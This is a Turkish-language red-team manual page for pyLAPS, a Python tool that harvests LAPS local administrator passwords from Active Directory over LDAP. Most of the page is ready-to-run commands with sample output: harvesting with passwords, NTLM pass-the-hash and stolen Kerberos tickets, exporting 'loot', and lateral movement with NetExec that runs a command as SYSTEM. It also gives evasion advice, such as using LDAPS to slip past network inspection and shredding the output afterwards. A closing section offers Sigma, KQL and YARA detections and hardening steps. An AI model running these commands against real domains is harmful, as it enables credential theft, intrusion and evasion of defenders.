# pyLAPS

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux platformu üzerinden LDAP/LDAPS protokolüyle Active Directory etki alanı denetleyicisine bağlanarak, Pass-the-Hash ve Kerberos biletleri desteğiyle LAPS yerel yönetici parolalarını hasat eden Python aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında yerel yönetici parolalarının merkezi olarak yönetilmesini ve her bilgisayarda benzersiz olmasını sağlayan Microsoft LAPS (Local Administrator Password Solution), parolaları istemcilerin Active Directory bilgisayar nesnelerinde (`ms-Mcs-AdmPwd` veya yeni Windows LAPS özniteliği olan `msLAPS-Password`) depolar. Windows işletim sistemi üzerinde çalışan LAPS araçları (PowerShell `LAPSToolkit` vb.) genellikle mevcut Windows oturum bağlamını veya açık kullanıcı parolasını kullanır.

Ancak kırmızı takım operasyonlarında operatör genellikle bir Linux denetim makinesinde (Kali Linux, Parrot OS vb.) konumlanır ve elinde yalnızca sızdırılmış bir NTLM hash değeri veya çalınmış bir Kerberos bileti (`.ccache`) bulunabilir. Bu senaryolarda Windows işletim sistemi bağımlılığı olmaksızın uzaktan parola çekebilmek büyük önem taşır.

**pyLAPS**, Python (`ldap3` ve `impacket` kütüphaneleri) kullanılarak geliştirilmiş, Linux yerelinde çalışan güçlü bir LAPS parola hasat aracıdır. Araç, etki alanı denetleyicisine LDAP (TCP 389) veya şifreli LDAPS (TCP 636) üzerinden doğrudan bağlanır. En büyük operasyonel avantajı, standart kullanıcı parolalarının yanı sıra **NTLM Pass-the-Hash (PtH)** ve **Kerberos Pass-the-Ticket (PtT)** kimlik doğrulama yöntemlerini tam olarak desteklemesidir. Kullanıcının okuma yetkisine sahip olduğu tüm `ms-Mcs-AdmPwd` değerlerini ve son kullanma tarihlerini LDAP arama filtreleri ile saniyeler içinde toplar ve ekrana döker.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              PYLAPS MIMARI AKIŞI                                  |
+-----------------------------------------------------------------------------------+
  [Linux Denetim Makinesi]                           [Domain Controller (DC)]
       (pyLAPS.py)                                      (LDAP / LDAPS Servisi)
            |                                                    |
            |--- 1. TCP 389 / 636 Bağlantısı ------------------->|
            |       [NTLM Hash / Kerberos Bilet ile LDAP Bind]   |
            |                                                    |--- 2. Kimlik Doğrulama
            |<-- 2. Bind Başarılı (LDAP Session Ready) ----------|       ve Yetki Kontrolü
            |                                                    |
            |--- 3. LDAP SearchRequest ------------------------->|--- 3. AD Veritabanı
            |       Filter: (&(objectCategory=computer)          |       Taranır (DACL
            |                 (ms-Mcs-AdmPwd=*))                 |       İzinleri Denetlenir)
            |                                                    |
            |<-- 4. SearchResultEntry Paketleri -----------------|
            |       [dNSHostName, ms-Mcs-AdmPwd, Expiration]     |
            |                                                    |
            v                                                    v
  [Sonuç Tablosu / JSON Çıktısı]
  ├── Host: WS01.corp.local   | Password: %a8!KmP#2026   | Exp: 2026-11-10
  ├── Host: SRV01.corp.local  | Password: AdminMaster#99 | Exp: 2026-10-30
  └── Host: DC02.corp.local   | (Erişim Reddedildi - Yetkisiz Hesap)
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Linux Yerel Çalışma** | Windows makinesine veya GUI arayüzüne gerek bırakmaz. | Kali/Linux terminalinden doğrudan operasyon yürütür. |
| **Pass-the-Hash (PtH)** | Düz metin şifre olmadan NTLM hash ile oturum açar. | Windows yerel araçlarının yapamadığı PtH desteğini sunar. |
| **Kerberos Entegrasyonu**| `KRB5CCNAME` ortam değişkeniyle bilet tabanlı bağlanır.| Bilet çalma (TGT/TGS) saldırıları sonrasında parola çeker. |
| **LDAPS (TLS) Desteği** | Port 636 üzerinden trafiği tamamen şifreler. | Ağ seviyesindeki NIDS paket incelemelerini atlatır. |
| **Yapılandırılmış JSON** | Çıktıları doğrudan JSON formatında üretebilir. | Diğer saldırı veya otomasyon araçlarına girdi sağlar. |

### Karşılaştırma Tablosu

| Özellik | pyLAPS | LAPSToolkit.ps1 | SharpLAPS | NetExec (`--laps`) |
| :--- | :--- | :--- | :--- | :--- |
| **Çalışma Platformu** | Linux / Windows (Python) | Windows (PowerShell) | Windows (.NET C#) | Linux / Windows (Python) |
| **Pass-the-Hash Desteği**| Evet (`-H` bayrağı) | Hayır (Windows API) | Kısmi (WMI tabanlı) | Evet (`-H` bayrağı) |
| **Kerberos Desteği** | Evet (`-k` bayrağı) | Windows oturumundan | Windows oturumundan | Evet (`-k` bayrağı) |
| **Uç Noktaya Dokunma** | Sıfır (Yalnızca DC LDAP) | Sıfır (Yalnızca DC LDAP) | Sıfır (Yalnızca DC LDAP) | Sıfır (LDAP Modunda) |
| **Format Seçenekleri** | Tablo / JSON | PSObject / CSV | Konsol Tablosu | Renkli CLI Tablosu |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`pyLAPS` komut satırından etki alanı adı, kimlik doğrulama yöntemi, DC adresi ve hedef filtreleme bayraklarıyla çağrılır:

```bash
python3 pyLAPS.py -d <DOMAIN> -u <KULLANICI> [-p <PAROLA>] [-H <NTLM_HASH>] --dc-ip <DC_IP> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Uzun Adı | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `-d` | `--domain` | Hedef Active Directory etki alanının FQDN adı. | `-d corp.local` |
| `-u` | `--user` | LDAP kimlik doğrulamasında kullanılacak hesap adı. | `-u jdoe` |
| `-p` | `--password` | Hesaba ait düz metin parola. | `-p 'Winter2026!'` |
| `-H` | `--hashes` | NTLM kimlik doğrulama hash değeri (LM:NTLM veya NTLM). | `-H 329153f560eb344c3f9e3ec4e086166f` |
| `-k` | `--kerberos` | Parola yerine Kerberos biletini (`KRB5CCNAME`) kullanır. | Bayrak |
| `--dc-ip` | `--dc-ip` | Hedef etki alanı denetleyicisinin IP adresi. | `--dc-ip 192.168.1.10` |
| `--ssl` | `--ssl` | Port 636 üzerinden şifreli LDAPS bağlantısı kurar. | Bayrak |
| `--ou` | `--target-ou` | Yalnızca belirtilen Organizasyonel Birimi (OU) sorgular. | `--ou "OU=Servers,DC=corp,DC=local"` |
| `--computer` | `--computer` | Yalnızca belirtilen tekil bilgisayarın parolasını sorgular. | `--computer "SRV-APP01"` |
| `--json` | `--json` | Çıktıyı JSON formatında ekrana veya dosyaya yazar. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Düz Metin Parola ile Etki Alanındaki Tüm LAPS Parolalarını Çekme
Geçerli bir domain kullanıcısının kimlik bilgileriyle LDAP üzerinden izinli tüm LAPS şifrelerini listeleme:

```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'P@ssw0rd2026!' --dc-ip 192.168.1.10
```

**Konsol Çıktı Analizi:**
```
[*] pyLAPS - Python LAPS Password Harvester
[*] Connecting to LDAP server 192.168.1.10:389...
[+] Successfully bound as corp.local\jdoe
[*] Searching for computer objects with ms-Mcs-AdmPwd...

Hostname                 Password                  Expiration (UTC)
----------------------------------------------------------------------
WKSTN-FIN-01.corp.local  %p9#L2k!xM81aQ            2026-11-15 10:30:00
WKSTN-HR-04.corp.local   &9aK!mX7#pQ12             2026-11-02 14:00:22
SRV-SQL-DEV.corp.local   Zx8#Lm!190PaQ             2026-10-28 09:12:45

[+] Found 3 readable LAPS passwords.
```

### Senaryo 2: NTLM Hash (Pass-the-Hash) ile LAPS Hasadı Yapma
Düz metin parolanın bulunmadığı, yalnızca SAM veya bellek dökümünden elde edilen NTLM hash'in kullanıldığı senaryo:

```bash
python3 pyLAPS.py -d corp.local -u srv_admin -H 329153f560eb344c3f9e3ec4e086166f --dc-ip 192.168.1.10
```

**Konsol Çıktı Analizi:**
```
[*] Authenticading via NTLM Hash (Pass-the-Hash)...
[+] LDAP Bind successful via NTLM SSP!
[*] Querying (ms-Mcs-AdmPwd=*)...
Hostname                 Password                  Expiration (UTC)
----------------------------------------------------------------------
SRV-BACKUP01.corp.local  B@ckupAdmin99!            2026-11-12 16:30:10
```

### Senaryo 3: Kerberos Bileti ile Şifreli LDAPS (Port 636) Üzerinden Sorgulama
Ağ dinlemesinden kaçınmak ve Kerberos TGS biletiyle şifreli kanaldan parola hasadı gerçekleştirmek:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
python3 pyLAPS.py -d corp.local -k --ssl --dc-ip 192.168.1.10
```

**Konsol Çıktı Analizi:**
```
[*] Loading Kerberos ticket from /tmp/administrator.ccache...
[*] Establishing TLS encrypted LDAPS session to 192.168.1.10:636...
[+] Kerberos GSSAPI authentication successful.
[+] Retrieved 18 computer passwords over encrypted channel.
```

### Senaryo 4: Belirli Bir OU Altındaki Sistemleri Filtreleme (`--ou`)
Yalnızca kritik veritabanı veya muhasebe sunucularını barındıran OU'yu hedef alma:

```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass123!' --dc-ip 192.168.1.10 --ou "OU=Databases,OU=Servers,DC=corp,DC=local"
```

**Konsol Çıktı Analizi:**
```
[*] Target OU filter applied: OU=Databases,OU=Servers,DC=corp,DC=local
Hostname                 Password                  Expiration (UTC)
----------------------------------------------------------------------
DB-ORACLE-01.corp.local  OraMaster2026!#Secure     2026-11-05 18:00:00
```

### Senaryo 5: Tekil Bir Bilgisayarın Parolasını Sorgulama
Yanal hareket yapılacak spesifik bir hedef sunucunun parolasını çekme:

```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass123!' --dc-ip 192.168.1.10 --computer "SRV-APP01"
```

**Konsol Çıktı Analizi:**
```
[*] Querying specific computer: SRV-APP01
Hostname                 Password                  Expiration (UTC)
----------------------------------------------------------------------
SRV-APP01.corp.local     W1nt3r#AppPass26          2026-11-20 12:00:00
```

### Senaryo 6: Sonuçları JSON Formatında Dışa Aktarma
Elde edilen parolaları otomatik komut zincirlerine veya parola listelerine beslemek üzere JSON çıktısı üretme:

```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass123!' --dc-ip 192.168.1.10 --json > /tmp/laps_loot.json
cat /tmp/laps_loot.json | jq .
```

**Konsol Çıktı Analizi:**
```json
[
  {
    "hostname": "WKSTN-FIN-01.corp.local",
    "password": "%p9#L2k!xM81aQ",
    "expiration": "2026-11-15 10:30:00"
  }
]
```

### Senaryo 7: Çözülen LAPS Parolası ile Evil-WinRM veya NetExec Üzerinden Yanal Hareket
Elde edilen yerel yönetici parolasını kullanarak hedef sunucuda anında komut çalıştırma:

```bash
nxc smb 192.168.1.55 -u Administrator -p '%p9#L2k!xM81aQ' --local-auth -x "whoami"
```

**Konsol Çıktı Analizi:**
```
SMB         192.168.1.55    445    WKSTN-FIN-01     [*] Windows 10 Pro 19044 x64
SMB         192.168.1.55    445    WKSTN-FIN-01     [+] WKSTN-FIN-01\Administrator:%p9#L2k!xM81aQ (Pwn3d!)
SMB         192.168.1.55    445    WKSTN-FIN-01     [+] Executed command: nt authority\system
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `LDAPSocketOpenError: unable to open socket on 389` | DC IP adresine ulaşılamıyor veya Windows Güvenlik Duvarı TCP 389 portunu engelliyor. | Ağ geçidini ve yönlendirmeleri denetleyin; IP adresinin doğruluğunu `nc -zv <DC_IP> 389` ile teyit edin. |
| `LDAPBindError: invalidCredentials / 80090308` | Girilen kullanıcı adı, parola veya NTLM hash geçersiz; hesap kilitlenmiş olabilir. | Kimlik bilgilerini teyit edin; hesap adını `CORP\user` yerine sadece `user` olarak geçirin. |
| `[!] No entries returned / Zero passwords found` | Kullanıcının bilgisayar nesnelerindeki `ms-Mcs-AdmPwd` özniteliğini okuma izni (Extended Right) yok. | LAPS yetkilendirmesi olan bir gruba (HelpDesk vb.) ait farklı bir kullanıcı hesabı veya hash temin edin. |
| `Kerberos: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Kerberos biletindeki SPN ile DC FQDN adı uyuşmuyor; IP adresi yerine FQDN kullanılmalıdır. | `--dc-ip` parametresi yerine `/etc/hosts` dosyasına DC FQDN adını (`dc01.corp.local`) eşleyerek çalıştırın. |
| `SSL: CERTIFICATE_VERIFY_FAILED on port 636` | Hedef etki alanı denetleyicisi kendinden imzalı (self-signed) SSL sertifikası kullanıyor. | pyLAPS komutuna `--ignore-ssl-cert` bayrağını ekleyin veya yerel CA sertifikasını `/etc/ssl/certs` dizinine tanıtın. |
| `ImportError: No module named 'ldap3'` | Python ortamında gereken bağımlılık kütüphaneleri kurulu değil. | `pip3 install ldap3 impacket` komutunu çalıştırarak bağımlılıkları yükleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: DÜŞÜK]
0 ----[3.0 - LINUX LDAP PASSIVE RECON]------------------------ 10
  - Ağ Seviyesi: Yalnızca DC ile LDAP/LDAPS iletişimi (Hedef bilgisayarlara sıfır paket)
  - Uç Nokta Seviyesi: Linux üzerinden çalıştırıldığı için hedef uç noktada SIFIR PROSES İZİ!
```

### 5.1 Bırakılan İzler (Event Logs)

* **Directory Service Event ID 1644 (LDAP Search Logging):**
  * Etki alanı denetleyicisi üzerinde LDAP arama filtresi olarak `(ms-Mcs-AdmPwd=*)` çalıştırıldığı günlüğe kaydedilir.
* **Windows Security Event ID 4624 (Logon Type 3):**
  * Linux denetim makinesinin IP adresinden Domain Controller'a NTLM veya Kerberos ile yapılan ağ oturumu kaydedilir.
* **Windows Security Event ID 4662 (Directory Service Access):**
  * Eğer `ms-Mcs-AdmPwd` için denetim (SACL) açıksa, okuma yapan hesap ve erişilen nesneler loglanır.
* **Hedef İstemcide Sıfır Log:**
  * Parolası çalınan istemci bilgisayar (Workstation), bu işlemden tamamen habersizdir; çünkü tüm veri doğrudan DC'nin veritabanından çekilir.

### 5.2 Ağ ve EDR İmzaları

* **Düz Metin LDAP vs Şifreli LDAPS:**
  Standart port 389 kullanıldığında `ms-Mcs-AdmPwd` özniteliği ağdan açık metin olarak akar. Ağ dinleyicileri (Wireshark, Zeek) bu parolaları paket yakalama sırasında açıkça görebilir. Bu nedenle daima `--ssl` kullanılmalıdır.
* **Toplu LDAP Arama Deseni:**
  Kısa süre içerisinde yüzlerce bilgisayar nesnesine yönelik özellik sorgulaması, Microsoft Defender for Identity (MDI) tarafından "LDAP Reconnaissance" anomalisi olarak işaretlenebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1003` | OS Credential Dumping | LDAP üzerinden LAPS parolalarını hasat etme. |
| **Discovery** | `T1087.002` | Account Discovery: Domain Account | Parola yetkilendirmelerini ve hesapları keşfetme. |
| **Defense Evasion** | `T1550.002` | Use Alternate Authentication: Pass the Hash | Düz metin şifre olmaksızın NTLM hash ile LDAP oturumu açma. |
| **Defense Evasion** | `T1550.003` | Use Alternate Authentication: Pass the Ticket | Kerberos biletleri ile kimlik doğrulama. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Düz Metin Ağ Trafiği (Port 389)** | Mümkün olan tüm senaryolarda `--ssl` bayrağı ile şifreli LDAPS (Port 636) kanalı tercih edilmelidir. |
| **Toplu LDAP Taraması** | Tüm etki alanını körlemesine taramak yerine, sadece hedeflenen spesifik makineler (`--computer`) sorgulanmalıdır. |
| **NTLM Kimlik Doğrulama Logu** | NTLM yerine Kerberos biletleri (`-k`) kullanılarak etki alanında daha meşru bir kimlik izi bırakılmalıdır. |
| **Çıktı Güvenliği** | Kaydedilen JSON dosyaları operasyon tamamlandıktan sonra güvenli silme ile imha edilmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: Şüpheli LDAP LAPS Öznitelik Taraması
```yaml
title: Harici IP Uzerinden ms-Mcs-AdmPwd LAPS LDAP Taramasi
id: c1298402-4412-4f88-a912-112233aa8899
status: experimental
description: Linux veya harici istemcilerden DC uzerine yapilan ms-Mcs-AdmPwd arama isteklerini Directory Service loglarindan tespit eder.
references:
    - https://attack.mitre.org/techniques/T1003/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    service: directory_service
    product: windows
    definition: 'Directory Service Event ID 1644'
detection:
    selection:
        EventID: 1644
        SearchFilter|contains: 'ms-Mcs-AdmPwd'
    condition: selection
falsepositives:
    - Mesru LAPS GUI veya AdmPwd.PS PowerShell yonetim komutlari.
level: high
tags:
    - attack.credential_access
    - attack.t1003
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// DC uzerinde gerceklesen olagandisi LDAP oturumlarini ve LAPS ozellik okuma aktivitelerini tespit eder
SecurityEvent
| where TimeGenerated >= ago(24h)
| where EventID == 4662
| where ObjectServer == "DS"
| where AccessMask has "0x10" or Properties has "ms-Mcs-AdmPwd"
| project TimeGenerated, Computer, Account, IpAddress, Properties
| order by TimeGenerated desc
```

#### YARA Kuralı: pyLAPS Python Script İmzası
```yara
rule Threat_Script_pyLAPS {
    meta:
        description = "pyLAPS Python LAPS parola hasat aracini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "pyLAPS" ascii wide nocase
        $s2 = "ms-Mcs-AdmPwd" ascii wide
        $s3 = "ldap3" ascii wide
        $s4 = "--dc-ip" ascii wide
        $s5 = "ms-Mcs-AdmPwdExpirationTime" ascii wide
    condition:
        3 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **LAPS Yetki Devri Denetimi:** `Get-AdmPwdReadPasswordPermission` cmdlet'i çalıştırılarak standart kullanıcı gruplarının LAPS okuma izinleri tamamen iptal edilmelidir.
2. **LDAP İmzalama ve Channel Binding:** Etki alanı denetleyicilerinde LDAP imzalama (`LDAPServerIntegrity = 2`) ve LDAP Channel Binding zorunlu tutularak NTLM relay ve yetkisiz dinlemeler engellenmelidir.
3. **Yeni Windows LAPS Geçişi:** Parolaları Active Directory'de şifrelenmiş olarak tutan ve Azure AD / Intune hibrit kimlik desteği sunan yeni Windows LAPS mimarisine geçiş yapılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Düz Metin Parola ile Standart LAPS Taraması
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'P@ssw0rd2026!' --dc-ip 192.168.1.10
```
* **Ne Yapar?:** Standart kullanıcı bilgileriyle bağlanarak okunabilir tüm LAPS parolalarını ekrana döker.
* **Ne Zaman Kullanılır?:** Etki alanı kullanıcısının parolası bilindiğinde en hızlı parola hasadı için.
* **Parametreler:** `-d` etki alanı, `-u` kullanıcı, `-p` şifre, `--dc-ip` DC adresi.

#### 2. Pass-the-Hash (NTLM) ile LAPS Hasadı
```bash
python3 pyLAPS.py -d corp.local -u srv_admin -H 329153f560eb344c3f9e3ec4e086166f --dc-ip 192.168.1.10
```
* **Ne Yapar?:** Düz metin şifre yerine NTLM hash kullanarak parolasız LAPS sorgusu yapar.
* **Ne Zaman Kullanılır?:** Bellekten veya SAM'den NTLM hash elde edildiğinde.
* **Parametreler:** `-H` NTLM hash dizesi.

#### 3. Kerberos Bileti (ccache) ile Bağlantı
```bash
KRB5CCNAME=/tmp/admin.ccache python3 pyLAPS.py -d corp.local -k --dc-ip 192.168.1.10
```
* **Ne Yapar?:** Ele geçirilen Kerberos biletini kullanarak parolasız ve hash'siz oturum açar.
* **Ne Zaman Kullanılır?:** Bilet çalma veya bilet enjeksiyonu sonrasında.
* **Parametreler:** `-k` Kerberos yetkilendirme bayrağı.

#### 4. LDAPS (Port 636) Şifreli Sorgulama
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass!' --dc-ip 192.168.1.10 --ssl
```
* **Ne Yapar?:** İletişimi SSL/TLS ile şifreleyerek ağ dinlemelerine karşı parolaları korur.
* **Ne Zaman Kullanılır?:** IDS/IPS ve ağ izleme sistemlerini atlatmak için.
* **Parametreler:** `--ssl` güvenli LDAP bayrağı.

#### 5. Belirli Bir OU Altını Filtreleme
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass!' --dc-ip 192.168.1.10 --ou "OU=Finance,DC=corp,DC=local"
```
* **Ne Yapar?:** Yalnızca belirtilen organizasyonel birimdeki makinelerin şifrelerini çeker.
* **Ne Zaman Kullanılır?:** Belirli departman sunucularına odaklanıldığında.
* **Parametreler:** `--ou <Distinguished_Name>`.

#### 6. Tekil Bilgisayar Parolası Çekme
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass!' --dc-ip 192.168.1.10 --computer "SRV-FILE01"
```
* **Ne Yapar?:** Yalnızca hedef sunucunun parolasını ve bitiş süresini getirir.
* **Ne Zaman Kullanılır?:** Spesifik bir hedefe sıçramadan hemen önce.
* **Parametreler:** `--computer <Sunucu_Adı>`.

#### 7. JSON Formatında Kaydetme
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass!' --dc-ip 192.168.1.10 --json > /tmp/laps.json
```
* **Ne Yapar?:** Çıktıyı yapılandırılmış JSON dosyası olarak diske kaydeder.
* **Ne Zaman Kullanılır?:** Verileri diğer araçlara aktarmak veya arşivlemek için.
* **Parametreler:** `--json` bayrağı.

#### 8. Güvenilmeyen Sertifikayı Yoksayarak LDAPS Bağlantısı
```bash
python3 pyLAPS.py -d corp.local -u jdoe -p 'Pass!' --dc-ip 192.168.1.10 --ssl --ignore-ssl-cert
```
* **Ne Yapar?:** Kendinden imzalı DC sertifikalarında oluşan doğrulama hatasını atlar.
* **Ne Zaman Kullanılır?:** Lab ve kurumsal ortamlarda sertifika hatası alındığında.
* **Parametreler:** `--ignore-ssl-cert`.

#### 9. Hasat Edilen Parolalarla NetExec Doğrulaması
```bash
nxc smb 192.168.1.0/24 -u Administrator -p 'LAPS_SIFRE' --local-auth
```
* **Ne Yapar?:** Elde edilen parolanın yerel ağdaki makinelerde çalıştığını onaylar.
* **Ne Zaman Kullanılır?:** Parolanın etki alanındaki etki alanını doğrulamak için.
* **Parametreler:** `--local-auth` yerel yönetici doğrulaması.

#### 10. Çevrimdışı JSON Dosyasını Güvenle Temizleme
```bash
shred -u -z -n 3 /tmp/laps.json
```
* **Ne Yapar?:** Hasat edilen LAPS parolalarını diskten geri getirilemez biçimde siler.
* **Ne Zaman Kullanılır?:** Test tamamlandıktan sonra hassas verileri imha etmek için.
* **Parametreler:** `shred -u -z -n 3`.

---

## Kaynaklar
* [pyLAPS Resmi GitHub Deposu](https://github.com/pwn3rzs/pylaps)
* [Microsoft Dokümantasyonu: LAPS Technical Reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/mt227395(v=ws.11))
* [Microsoft Dokümantasyonu: [MS-LSAD] Local Security Authority (Domain Policy) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/)
* [MITRE ATT&CK: OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)
* [HackTricks: Pentesting LAPS with Linux Tools](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#laps)
* [SpecterOps: Microsoft LAPS Operations and Abuses](https://posts.specterops.io/)

---

> **Önceki:** [← LAPSToolkit.ps1](./LAPSToolkit.md) · **Sonraki:** [cve-2020-1472-exploit (Kategori 13) →](../Kategori_13_Tarihi_ve_Kritik_Zafiyet_Araclari/cve-2020-1472-exploit.md)
